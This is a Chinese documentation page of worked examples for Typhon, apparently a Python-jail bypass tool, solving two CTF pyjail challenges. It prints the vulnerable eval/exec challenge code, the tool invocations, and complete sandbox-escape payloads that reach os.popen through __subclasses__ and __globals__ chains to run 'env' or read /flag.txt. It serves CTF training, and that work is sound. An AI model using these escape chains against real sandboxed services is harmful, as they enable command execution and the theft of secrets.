EXAMPLE 示例
============

此页用于提供关于 ``Typhon`` 的一些实战例题。

PwnyCTF-Pyjail 2
-------------------

题目链接： https://ctf.sigpwny.com/challenges#Vault/Pyjail%202-633

.. code-block:: python
    :linenos:
    :emphasize-lines: 3,26

    #!/usr/bin/env python3

    #Flag is at /flag.txt

    def is_bad(user_input):
        banned = '"*\'`x'

        for c in banned:
            if c in user_input:
                return True
        
        return False


    def main():

        print("You wake up in the jail gym. Your head is still sore from the bonk.")

        user_input = input('What do you have to say for yourself? ')

        if is_bad(user_input):
            print('Sorry, not good enough. Go back to jail.')
            return
        
        try:
            exec(user_input)
            print("Ok, we'll consider it.")
        except:
            print('Sorry, not good enough. Go back to jail.')


    if __name__ == '__main__':
        main()

flag位于 ``/flag.txt`` 文件中。

注意到第25行存在执行函数： ``exec(user_input)``。同时，此题目的WAF有且仅有 ``is_bad()`` 函数，其功能为检测用户输入是否包含 ``"``、 ``'``、 ``*``、  `````、 ``x``。

此处我们将执行行删去，换为对应的命令。

我们将 ``main()`` 函数改为：

.. code-block:: python
    :linenos:
    :emphasize-lines: 12,13

    def main():

        print("You wake up in the jail gym. Your head is still sore from the bonk.")

        user_input = input('What do you have to say for yourself? ')

        if is_bad(user_input):
            print('Sorry, not good enough. Go back to jail.')
            return
        
        try:
            import Typhon
            Typhon.bypassRCE('cat /flag.txt', banned_chr = '"*\'`x')
            print("Ok, we'll consider it.")
        except:
            print('Sorry, not good enough. Go back to jail.')

运行，随意输入使得控制流进入 ``Typhon.bypassRCE()`` 函数，即可得到flag（在 ``input()`` 时直接回车即可）。

.. code-block::

    You wake up in the jail gym. Your head is still sore from the bonk.
    What do you have to say for yourself?

        .-')          _                 Typhon: a pyjail bypassing tool
       (`_^ (    .----`/
        ` )  \_/`   __/     __,    [Typhon Version]: v1.0.10
        __{   |`  __/      /_/     [Python Version]: v3.13.4
       / _{    \__/ '--.  //       [Github]: https://github.com/Team-intN18-SoybeanSeclab/Typhon
       \_> \_\  >__/    \((        [Author]: LamentXU <lamentxu644@gmail.com>
            _/ /` _\_   |))

    WARNING [!] banned_chr should be a list, converting to list for compatibility.
    WARNING [!] local scope not specified, using the global scope.
    INFO [*] 7 paths found to directly getshell. Try to bypass blacklist with them. Please be paitent.
    Bypassing (7/7): [===============================================================================>] 100.0%
    INFO [+] directly getshell success. 49 payload(s) in total.
    INFO [+] You now can use this payload to getshell directly with proper input.




    -----------Progress-----------


    directly input bypass(49 payloads found): help()


    -----------Progress-----------


    +++++++++++Jail broken+++++++++++


    help()


    +++++++++++Jail broken+++++++++++

此时，我们再远程环境中输入 ``help()`` 再利用 `相应的技术 <https://typhonbreaker.readthedocs.io/zh-cn/latest/FAQ.html#id1>`_ 进行绕过即可 。

Typhon-Sample Pyjail 1 
----------------------

本题目由此文档编写。

..code-block:: python
    :linenos:
    :emphasize-lines: 1,23,36

        # flag in env
        WELCOME = '''
        _     ______      _                              _       _ _ 
        | |   |  ____|    (_)                            | |     (_) |
        | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
        | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | |·
        | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
        |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
                    __/ |                                           
                    |___/                                            
        '''
        import string

        print(WELCOME)

        print("Welcome to the python jail")
        print("Let's have an beginner jail of calc")
        print("Enter your expression and I will evaluate it for you.")
        if __name__ == '__main__':
            while True:
                try:
                    suc = True
                    cmd = input("Enter command: ")
                    blacklist = ['__loader__','__import__','os','\\x','+','join', '"', "'",'2','3','4','5','6','7','8','9','subprocess','[',']','sys',
                                        'pty','uuid','future','codecs','io','multi']
                    for i in blacklist:
                        if i in cmd:
                            print("Command not allowed")
                            suc = False
                            break
                    for i in cmd:
                        if i not in string.printable:
                            print("Command not allowed")
                            suc = False
                            break
                    if suc:
                        print(eval(cmd, {'__builtins__':None, 'st':str}))
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f'e ==> {e}')
                    pass

可以看到该题目有如下限制：
- 禁止使用 ``__loader__``、 ``__import__``、 ``os``、 ``\\x``、 ``+``、 ``join``、 ``"``、 ``'``、 ``2``、 ``3``、 ``4``、 ``5``、 ``6``、 ``7``、 ``8``、 ``9``、 ``subprocess``、 ``[``、 ``]``、 ``sys``、 ``pty``、 ``uuid``、 ``future``、 ``codecs``、 ``io``、 ``multi`` 等关键字。
- 禁止使用除 ``printable`` 字符集以外的字符。
- 命名空间为 ``{'__builtins__':None, 'st':str}`` 函数。

我们可以利用 ``Typhon`` 库中的 ``bypassRCE()`` 函数绕过限制。由于flag在环境中，我们执行 ``env`` 即可得到flag。

..code-block:: python
    :linenos:
    :emphasize-lines: 23,36

        import Typhon
        Typhon.bypassRCE(
            'env',
            local_scope = {'__builtins__':None, 'st':str},
            banned_chr = ['__loader__','__import__','os','\\x','+','join', '"', "'",'2','3','4','5','6','7','8','9','subprocess','[',']','sys',
                                        'pty','uuid','future','codecs','io','multi']
            )

.. tips::

    此处由于已经指定了命名空间，我们可以不在源代码上做修改，直接另起一个脚本调用 ``Typhon.bypassRCE()`` 函数。但当题目没有指定命名空间时（即没有 ``local_scope`` 参数时），我们需要在源代码中调用 ``Typhon.bypassRCE()`` 函数。
    假如你不确定的话，也可以只在源代码中调用。

执行上述代码，即可得到payload。

.. note:: 
    对于复杂度较高的题目，可能需要等候较长时间。

.. code-block::

        .-')          _                 Typhon: a pyjail bypassing tool
       (`_^ (    .----`/
        ` )  \_/`   __/     __,    [Typhon Version]: v1.0.10
        __{   |`  __/      /_/     [Python Version]: v3.9.0
       / _{    \__/ '--.  //       [Github]: https://github.com/Team-intN18-SoybeanSeclab/Typhon
       \_> \_\  >__/    \((        [Author]: LamentXU <lamentxu644@gmail.com>
            _/ /` _\_   |))

    INFO [-] no paths found to directly getshell.
    INFO [*] Try to get string literals from docstrings.
    Bypassing (421/421): [===============================================================================>] 100.0%
    INFO [*] Try to get string literals from __name__.
    Bypassing (3/3): [===============================================================================>] 100.0%
    INFO [*] string literals found: {'s': 'st.__doc__.__getitem__(0)', 't': 'st.__doc__.__getitem__(1)', 'r': 'st.__doc__.__getitem__(0b10)', 'o': 'st.__doc__.__getitem__(0b100)', 'b': 'st.__doc__.__getitem__(0b101)', 'j': 'st.__doc__.__getitem__(0b110)', 'e': 'st.__doc__.__getitem__(0b111)', 'c': 'st.__doc__.__getitem__(0b1000)', 'y': 'st.__doc__.__getitem__(0b11011)', 'u': 'st.__doc__.__getitem__(0b100100)', 'f': 'st.__doc__.__getitem__(0b100101)', 'n': 'st.__doc__.__getitem__(0b101101)', 'd': 'st.__doc__.__getitem__(0b110000)', 'i': 'st.__doc__.__getitem__(0b110001)', 'g': 'st.__doc__.__getitem__(0b110011)', 'C': 'st.__doc__.__getitem__(0b1001001)', 'a': 'st.__doc__.__getitem__(0b1001100)', 'w': 'st.__doc__.__getitem__(0b1010100)', 'm': 'st.__doc__.__getitem__(0b1100111)', 'h': 'st.__doc__.__getitem__(0b1101010)', 'v': 'st.__doc__.__getitem__(111)', 'I': 'st.__doc__.__getitem__(0b1111011)', 'p': 'st.__doc__.__getitem__(0b10010101)', 'x': 'st.__doc__.__getitem__(0b10110101)', 'l': 'st.__doc__.__getitem__(0b11010000)', 'O': 'st.__doc__.__getitem__(0b100001010)'}
    INFO [*] int literals found: {'0': '0', '1': '1'}
    INFO [-] no paths found to directly getshell.
    INFO [*] 3 paths found to obtain generator. Try to bypass blacklist with them. Please be paitent.
    Bypassing (3/3): [===============================================================================>] 100.0%
    INFO [+] Success. 3 payload(s) in total.
    INFO [*] Using (a for a in ()).gi_frame as payload of generator
    INFO [*] 2 paths found to obtain type. Try to bypass blacklist with them. Please be paitent.
    Bypassing (2/2): [===============================================================================>] 100.0%
    INFO [+] Success. 2 payload(s) in total.
    INFO [*] Using st.__class__ as payload of type
    INFO [*] 6 paths found to obtain object. Try to bypass blacklist with them. Please be paitent.
    Bypassing (6/6): [===============================================================================>] 100.0%
    INFO [+] Success. 5 payload(s) in total.
    INFO [*] Using ().__class__.__mro__.__getitem__(1) as payload of object
    INFO [*] 3 paths found to obtain bytes. Try to bypass blacklist with them. Please be paitent.
    Bypassing (3/3): [===============================================================================>] 100.0%
    INFO [+] Success. 2 payload(s) in total.
    INFO [*] Using st.__class__(st().encode()) as payload of bytes
    INFO [*] __builtins__ in this namespace is deleted, no way to restore it.
    INFO [*] try to find __builtins__ in other namespaces.
    INFO [*] 5 paths found to restore builtins in other namespaces. Try to bypass blacklist with them. Please be paitent.
    Bypassing (5/5): [===============================================================================>] 100.0%
    INFO [-] no way to find a bypass method to restore builtins in other namespaces.
    INFO [*] Trying to find inheritance chains.
    Bypassing (206/206): [===============================================================================>] 100.0%
    INFO [+] Found inheritance chain: ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0b101).__add__(st.__doc__.__getitem__(0b100100)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b11010000)).__add__(st.__doc__.__getitem__(1)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(0))) -> builtins
    INFO [+] Found inheritance chain: ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))) -> sys
    INFO [*] 2 paths found to obtain import. Try to bypass blacklist with them. Please be paitent.
    Bypassing (2/2): [===============================================================================>] 100.0%
    INFO [-] no way to bypass blacklist to obtain import.
    INFO [*] 2 paths found to obtain load_module. Try to bypass blacklist with them. Please be paitent.
    Bypassing (2/2): [===============================================================================>] 100.0%
    INFO [-] no way to bypass blacklist to obtain load_module.
    INFO [-] no paths found to obtain modules.
    INFO [*] 4 paths found to obtain import. Try to bypass blacklist with them. Please be paitent.
    Bypassing (4/4): [===============================================================================>] 100.0%
    INFO [-] no way to bypass blacklist to obtain import.
    INFO [*] 4 paths found to obtain load_module. Try to bypass blacklist with them. Please be paitent.
    Bypassing (4/4): [===============================================================================>] 100.0%
    INFO [-] no way to bypass blacklist to obtain load_module.
    INFO [*] 1 paths found to obtain modules. Try to bypass blacklist with them. Please be paitent.
    Bypassing (1/1): [===============================================================================>] 100.0%
    INFO [+] Success. 1 payload(s) in total.
    INFO [*] Using ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules as payload of modules
    INFO [*] try to import modules with MODULES path.
    Bypassing (20/20): [===============================================================================>] 100.0%
    INFO [*] modules we have found:
    INFO {'builtins': <module 'builtins' (built-in)>, 'sys': <module 'sys' (built-in)>, 'os': <module 'os' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\os.py'>, 'codecs': <module 'codecs' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\codecs.py'>, 'warnings': <module 'warnings' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\warnings.py'>, 'importlib': <module 'importlib' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\importlib\\__init__.py'>, 'reprlib': <module 'reprlib' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\reprlib.py'>, 'linecache': <module 'linecache' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\linecache.py'>, 'io': <module 'io' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\io.py'>}
    INFO [-] no paths found to obtain exec.
    INFO [+] Using env as the command to execute.
    INFO [*] 10 paths found to obtain __import__2RCE. Try to bypass blacklist with them. Please be paitent.
    Bypassing (10/10): [===============================================================================>] 100.0%
    INFO [+] Success. 1 payload(s) in total.
    INFO [*] Using ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b100).__add__(st.__doc__.__getitem__(0))).popen(st.__doc__.__getitem__(0b111).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(111))).read() as payload of __import__2RCE


    WARNING [!] index 0 of st.__doc__[0] must match the string literal s.
    WARNING [!] index 4 of st.__doc__[4] must match the string literal o.
    WARNING [!] index 7 of st.__doc__[7] must match the string literal e.
    WARNING [!] index 27 of st.__doc__[27] must match the string literal y.
    WARNING [!] index 45 of st.__doc__[45] must match the string literal n.
    WARNING [!] index 111 of st.__doc__[111] must match the string literal v.
    WARNING [!] 110 is the index of StreamReaderWriter, path to sys must fit in index of StreamReaderWriter.
    WARNING [!] index 1 of st.__doc__[1] must match the string literal t.
    WARNING [!] index 5 of st.__doc__[5] must match the string literal b.
    WARNING [!] index 36 of st.__doc__[36] must match the string literal u.
    WARNING [!] index 49 of st.__doc__[49] must match the string literal i.
    WARNING [!] index 208 of st.__doc__[208] must match the string literal l.
    WARNING [!] 110 is the index of StreamReaderWriter, path to builtins must fit in index of StreamReaderWriter.
    WARNING [!] index 8 of st.__doc__[8] must match the string literal c.
    WARNING [!] index 48 of st.__doc__[48] must match the string literal d.
    WARNING [!] index 2 of st.__doc__[2] must match the string literal r.
    WARNING [!] index 51 of st.__doc__[51] must match the string literal g.
    WARNING [!] index 76 of st.__doc__[76] must match the string literal a.
    WARNING [!] index 84 of st.__doc__[84] must match the string literal w.
    WARNING [!] index 103 of st.__doc__[103] must match the string literal m.
    WARNING [!] index 149 of st.__doc__[149] must match the string literal p.
    WARNING [!] index 106 of st.__doc__[106] must match the string literal h.


    -----------Progress-----------


    directly input bypass(0 payload found): None
    generator(3 payloads found): (a for a in ()).gi_frame
    type(2 payloads found): st.__class__
    object(5 payloads found): ().__class__.__mro__.__getitem__(1)
    bytes(2 payloads found): st.__class__(st().encode())
    import(0 payload found): None
    load_module(0 payload found): None
    modules(1 payload found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules
    builtins(3 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0b101).__add__(st.__doc__.__getitem__(0b100100)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b11010000)).__add__(st.__doc__.__getitem__(1)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(0)))
    sys(3 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0)))
    os(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b100).__add__(st.__doc__.__getitem__(0)))
    codecs(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b1000).__add__(st.__doc__.__getitem__(0b100)).__add__(st.__doc__.__getitem__(0b110000)).__add__(st.__doc__.__getitem__(0b111)).__add__(st.__doc__.__getitem__(0b1000)).__add__(st.__doc__.__getitem__(0)))
    warnings(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b1010100).__add__(st.__doc__.__getitem__(0b1001100)).__add__(st.__doc__.__getitem__(0b10)).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(0b110011)).__add__(st.__doc__.__getitem__(0)))
    importlib(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b110001).__add__(st.__doc__.__getitem__(0b1100111)).__add__(st.__doc__.__getitem__(0b10010101)).__add__(st.__doc__.__getitem__(0b100)).__add__(st.__doc__.__getitem__(0b10)).__add__(st.__doc__.__getitem__(1)).__add__(st.__doc__.__getitem__(0b11010000)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101)))
    reprlib(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b10).__add__(st.__doc__.__getitem__(0b111)).__add__(st.__doc__.__getitem__(0b10010101)).__add__(st.__doc__.__getitem__(0b10)).__add__(st.__doc__.__getitem__(0b11010000)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101)))
    linecache(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b11010000).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(0b111)).__add__(st.__doc__.__getitem__(0b1000)).__add__(st.__doc__.__getitem__(0b1001100)).__add__(st.__doc__.__getitem__(0b1000)).__add__(st.__doc__.__getitem__(0b1101010)).__add__(st.__doc__.__getitem__(0b111)))
    io(2 payloads found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b110001).__add__(st.__doc__.__getitem__(0b100)))
    exec(0 payload found): None
    __import__2RCE(1 payload found): ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b100).__add__(st.__doc__.__getitem__(0))).popen(st.__doc__.__getitem__(0b111).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(111))).read()


    -----------Progress-----------


    +++++++++++Jail broken+++++++++++


    ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b100).__add__(st.__doc__.__getitem__(0))).popen(st.__doc__.__getitem__(0b111).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(111))).read()
    Reminder: index 0 of st.__doc__[0] must match the string literal s.
    Reminder: index 4 of st.__doc__[4] must match the string literal o.
    Reminder: index 7 of st.__doc__[7] must match the string literal e.
    Reminder: index 27 of st.__doc__[27] must match the string literal y.
    Reminder: index 45 of st.__doc__[45] must match the string literal n.
    Reminder: index 111 of st.__doc__[111] must match the string literal v.
    Reminder: 110 is the index of StreamReaderWriter, path to sys must fit in index of StreamReaderWriter

根据 ``reminder`` 信息稍微调整payload即可利用 ``().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b100).__add__(st.__doc__.__getitem__(0))).popen(st.__doc__.__getitem__(0b111).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(111))).read()`` 得到flag。